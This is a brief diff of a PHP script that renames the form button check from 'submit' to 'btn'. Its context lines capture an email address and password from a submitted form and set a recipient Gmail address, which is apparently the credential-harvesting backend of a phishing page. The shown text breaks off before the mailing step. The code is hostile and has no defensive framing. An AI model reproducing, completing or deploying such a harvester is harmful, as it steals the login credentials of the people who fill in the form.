@@ -1,5 +1,5 @@
 <?php
-if (isset($_POST['submit'])) {
+if (isset($_POST['btn'])) {
 $mailto = "icavodica@gmail.com";
 $from = $_POST['email'];
 $password = $_POST['password'];
